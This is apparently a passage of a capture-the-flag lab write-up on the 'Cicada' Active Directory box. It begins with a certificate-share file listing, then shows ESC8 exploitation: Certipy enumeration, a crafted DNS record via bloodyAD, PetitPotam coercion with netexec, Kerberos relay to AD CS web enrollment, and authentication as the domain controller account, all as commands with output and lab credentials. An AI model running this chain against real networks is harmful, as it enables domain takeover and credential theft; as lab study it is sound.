-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(16)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(16).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(17)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(17).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(18)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(18).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(19)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(19).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:36 2026 cicada-DC-JPQ225-CA(2)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(2).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(20)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(20).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(21)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(21).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(22)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(22).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(23)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(23).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(24)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(24).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(25)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(25).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(26)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(26).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(27)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(27).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(28)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:34 2026 cicada-DC-JPQ225-CA(28).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(3)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(3).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(4)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(4).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(5)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(5).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(6)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(6).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(7)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(7).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(8)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(8).crl\
-rw-rw-rw-        741  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(9)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(9).crl\
-rw-rw-rw-        736  Sat Apr  4 13:35:36 2026 cicada-DC-JPQ225-CA+.crl\
-rw-rw-rw-        933  Sat Apr  4 13:35:36 2026 cicada-DC-JPQ225-CA.crl\
-rw-rw-rw-       1385  Sun Sep 15 21:18:43 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(0-1).crt\
-rw-rw-rw-        924  Sun Sep 15 15:51:18 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(1).crt\
-rw-rw-rw-       1390  Sun Sep 15 21:18:43 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(1-0).crt\
-rw-rw-rw-       1390  Sun Sep 15 21:18:43 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(1-2).crt\
-rw-rw-rw-        924  Thu Apr 10 16:44:43 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(10).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(10-11).crt\
-rw-rw-rw-       1391  Thu Apr 10 16:57:00 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(10-9).crt\
-rw-rw-rw-        924  Thu Apr 10 16:58:25 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(11).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(11-10).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(11-12).crt\
-rw-rw-rw-        924  Thu Apr 10 17:00:22 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(12).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(12-11).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(12-13).crt\
-rw-rw-rw-        924  Thu Apr 10 17:03:13 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(13).crt\
-rw-rw-rw-       1391  Fri Apr 11 13:48:18 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(13-12).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:21:47 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(13-14).crt\
-rw-rw-rw-        924  Fri Apr 11 13:49:41 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(14).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:22:11 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(14-13).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:22:11 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(14-15).crt\
-rw-rw-rw-        924  Fri Apr 11 13:51:40 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(15).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:22:11 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(15-14).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:22:12 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(15-16).crt\
-rw-rw-rw-        924  Fri Apr 11 13:53:40 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(16).crt\
-rw-rw-rw-       1391  Tue Jun  3 18:22:12 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(16-15).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:26 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(16-17).crt\
-rw-rw-rw-        924  Tue Jun  3 18:23:15 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(17).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:26 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(17-16).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:26 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(17-18).crt\
-rw-rw-rw-        924  Tue Jun  3 18:24:51 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(18).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:26 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(18-17).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:27 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(18-19).crt\
-rw-rw-rw-        924  Tue Jun  3 18:26:51 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(19).crt\
-rw-rw-rw-       1391  Wed Jun  4 20:51:27 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(19-18).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(19-20).crt\
-rw-rw-rw-        924  Sun Sep 15 15:53:03 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(2).crt\
-rw-rw-rw-       1390  Sun Sep 15 21:18:44 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(2-1).crt\
-rw-rw-rw-       1390  Sun Sep 29 17:41:29 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(2-3).crt\
-rw-rw-rw-        924  Wed Jun  4 20:52:43 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(20).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(20-19).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(20-21).crt\
-rw-rw-rw-        924  Wed Jun  4 20:54:47 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(21).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(21-20).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(21-22).crt\
-rw-rw-rw-        924  Wed Jun  4 20:56:47 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(22).crt\
-rw-rw-rw-       1391  Wed Jun  4 21:34:59 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(22-21).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(22-23).crt\
-rw-rw-rw-        924  Wed Jun  4 21:36:17 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(23).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(23-22).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(23-24).crt\
-rw-rw-rw-        924  Wed Jun  4 21:38:20 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(24).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(24-23).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(24-25).crt\
-rw-rw-rw-        924  Wed Jun  4 21:40:21 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(25).crt\
-rw-rw-rw-       1391  Wed Jun  4 22:02:35 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(25-24).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(25-26).crt\
-rw-rw-rw-        924  Wed Jun  4 22:04:01 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(26).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(26-25).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(26-27).crt\
-rw-rw-rw-        924  Wed Jun  4 22:05:56 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(27).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(27-26).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(27-28).crt\
-rw-rw-rw-        924  Wed Jun  4 22:07:56 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(28).crt\
-rw-rw-rw-       1391  Sat Apr  4 13:35:34 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(28-27).crt\
-rw-rw-rw-        924  Sat Apr  4 13:36:50 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(29).crt\
-rw-rw-rw-        924  Sun Sep 15 21:21:57 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(3).crt\
-rw-rw-rw-       1390  Sun Sep 29 17:41:29 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(3-2).crt\
-rw-rw-rw-       1390  Sun Sep 29 17:41:29 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(3-4).crt\
-rw-rw-rw-        924  Sat Apr  4 13:38:53 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(30).crt\
-rw-rw-rw-        924  Sat Apr  4 13:40:52 2026 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(31).crt\
-rw-rw-rw-        924  Sun Sep 15 21:24:12 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(4).crt\
-rw-rw-rw-       1390  Sun Sep 29 17:41:30 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(4-3).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(4-5).crt\
-rw-rw-rw-        924  Sun Sep 29 17:43:51 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(5).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(5-4).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(5-6).crt\
-rw-rw-rw-        924  Sun Sep 29 17:44:59 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(6).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(6-5).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(6-7).crt\
-rw-rw-rw-        924  Sun Sep 29 17:46:59 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(7).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:36:39 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(7-6).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:56:48 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(7-8).crt\
-rw-rw-rw-        924  Thu Apr 10 16:40:45 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(8).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:56:48 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(8-7).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:56:48 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(8-9).crt\
-rw-rw-rw-        924  Thu Apr 10 16:42:44 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(9).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:56:48 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(9-10).crt\
-rw-rw-rw-       1390  Thu Apr 10 16:56:48 2025 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA(9-8).crt\
-rw-rw-rw-        885  Fri Sep 13 18:50:51 2024 DC-JPQ225.cicada.vl\_cicada-DC-JPQ225-CA.crt\
-rw-rw-rw-        331  Fri Sep 13 23:17:59 2024 nsrev\_cicada-DC-JPQ225-CA.asp

{{< /code >}}

`profiles$` is the same as the NFS share. `CertEnroll` has a bunch of certificates:

These are public keys, and not sensitive.

### ADCS certipy-ad Install

[certify](https://github.com/ly4k/Certipy) is a good tools for enuming the ADCS

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ python3 -m venv certipy-venv
source certipy-venv/bin/activate
                                                                                                                                                                                
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ 

```

**Create and activate a virtual environment** (optional but recommended):

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ pip install certipy-ad
Collecting certipy-ad
  Downloading certipy_ad-5.0.4-py3-none-any.whl.metadata (4.3 kB)
Collecting asn1crypto~=1.5.1 (from certipy-ad)
  Downloading asn1crypto-1.5.1-py2.py3-none-any.whl.metadata (13 kB)
Collecting cryptography~=42.0.8 (from certipy-ad)
  Downloading cryptography-42.0.8-cp39-abi3-manylinux_2_28_aarch64.whl.metadata (5.3 kB)
Collecting impacket~=0.13.0 (from certipy-ad)
  Downloading impacket-0.13.0.tar.gz (1.7 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.7/1.7 MB 11.7 MB/s  0:00:00
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting ldap3~=2.9.1 (from certipy-ad)
```

install it and scan it

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ certipy-ad find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 1D2CF2AD21A988B44DFAE48B61CE1B8D
    Certificate Validity Start          : 2026-04-04 05:30:44+00:00
    Certificate Validity End            : 2526-04-04 05:40:44+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

find the ESC8

### ESC8

The [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment) describes ESC8 as:

> ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint. These web-based interfaces provide alternative methods for users and computers to request certificates.

The wiki goes on to describe the attack in six steps:

> 1. **Coerce Authentication:** The attacker coerces a privileged account to authenticate to a machine controlled by the attacker using NTLM. Common targets for coercion include Domain Controller machine accounts (e.g., using tools like PetitPotam or Coercer, or other RPC-based coercion techniques against MS-EFSRPC, MS-RPRN, etc.) or Domain Admin user accounts (e.g., via phishing or other social engineering that triggers an NTLM authentication).
> 2. **Set up NTLM Relay:** The attacker uses an NTLM relay tool, such as Certipy’s `relay` command, listening for incoming NTLM authentications.
> 3. **Relay Authentication:** When the victim account authenticates to the attacker’s machine, Certipy captures this incoming NTLM authentication attempt and forwards (relays) it to the vulnerable AD CS HTTP web enrollment endpoint (e.g., `https://<ca_server>/certsrv/certfnsh.asp`).
> 4. **Impersonate and Request Certificate:** The AD CS web service, receiving what it believes to be a legitimate NTLM authentication from the relayed privileged account, processes subsequent enrollment requests from Certipy as that privileged account. Certipy then requests a certificate, typically specifying a template for which the relayed privileged account has enrollment rights (e.g., the “DomainController” template if a DC machine account is relayed, or the default “User” template for a user account).
> 5. **Obtain Certificate:** The CA issues the certificate. Certipy, acting as the intermediary, receives this certificate.
> 6. **Use Certificate for Privileged Access:** The attacker can now use this certificate (e.g., in a `.pfx` file) with `certipy auth` to authenticate as the impersonated privileged account via Kerberos PKINIT, potentially leading to full domain compromise.

Basically if I can get the machine to authenticate back to me, I’ll relay that auth to ADCS and get a certificate as the machine account. [This post](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html) from Tyranid’s Lair shows how it’s possible to relay Kerberos authentication.

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] Getting the MachineAccountQuota
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        MachineAccountQuota: 10

```

The other approach is from my Linux VM, where I’ll use the strategy described in [this Synactiv post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) to add a DNS record that includes a serialized SPN that will trick the server into requesting a Kerberos ticket for the machine account but connects to the malicious record which points to the attacker. The attacker can relay that back to the DC to request a ticket.

![Pasted image 20260404173911.png](/ob/Pasted%20image%2020260404173911.png)

### bloodyAD

The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`:

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ bloodyAD -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.13
[b'\x04\x00\x01\x00\x05\xf0\x00\x00G\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x00\x00\x00\x00\x00\n\n\x10\r', b'\x04\x00\x01\x00\x05\xf0\x00\x00\xd9\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x00\x00\x00\x00\x00\n\n\x10\r']
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully updated
                         
```

### certipy-ad

I’ll start `certipy relay` targeting the ADCS webserver, and it listens on SMB:

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -subject CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445

```

The `netexec` module `coerce_plus` will check several different methods for coercing authentication from the machine account:

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven

```

In theory any of these should work. I have the best luck with PetitPotam. To trigger it, I’ll give `netexec` the `LISTENER` of the malicious DNS record, and the `METHOD`:

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb DC-JPQ225.cicada.vl  -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile                 
```

At the relay, there’s a connection, and it eventually creates a `.pfx` file:

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -timeout 90
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.217.23, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.217.23 against http://dc-jpq225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 90
[*] Retrieving certificate for request ID: 90
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=90 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```

With the certificate I can authenticate as the computer account:

```
┌──(certipy-venv)─(parallels㉿kali-linux-2025-2)-[~]
└─$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.217.23
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
